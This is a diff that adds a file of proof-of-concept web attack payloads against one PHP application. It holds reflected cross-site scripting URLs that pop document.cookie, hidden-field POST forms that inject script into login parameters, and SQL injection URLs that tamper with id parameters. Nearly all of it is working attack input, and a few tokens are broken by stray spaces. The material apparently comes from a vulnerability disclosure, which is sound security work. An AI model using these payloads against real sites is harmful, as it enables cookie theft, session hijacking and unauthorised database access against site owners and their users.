@@ -1,0 +1,37 @@
+
+http://www.example.com/index.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/modules/admin/admin_module_index.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/ script%3E
+http://www.example.com/modules/calendar/customise_calendar_times.php/%22%3E%3Cscript%3Ealert%28document.cooki e%29;%3C/script%3E
+
+&lt;form action=&quot;http://www.example.com/index.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;loginwww.example.com&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[password]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(2);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[rebuild_cache]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(3);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[remember_me]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(4);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[skin]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(5);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[username]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(6);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; id=&quot;btn&quot;&gt;
+&lt;/form&gt;
+
+
+http://www.example.com/licence/index.php?framed=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/licence/view.php?framed=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+&lt;form action=&quot;http://www.example.com/pub/clients.php&quot; method=&quot;post&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;loginwww.example.com&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[username]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(2);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[password]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(3);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[webform]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(4);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[disable_email_check]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(5);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[client_email]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(6);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login[client_password]&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(7);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; id=&quot;btn&quot;&gt;
+&lt;/form&gt;
+
+
+http://www.example.com/modules/Documents/version_list.php?parent_id=1%20AND%201=2%20--%202
+
+http://www.example.com/modules/Documents/index.php?id=1&amp;contact_id=1%27%20OR%20%271%27=%271
+
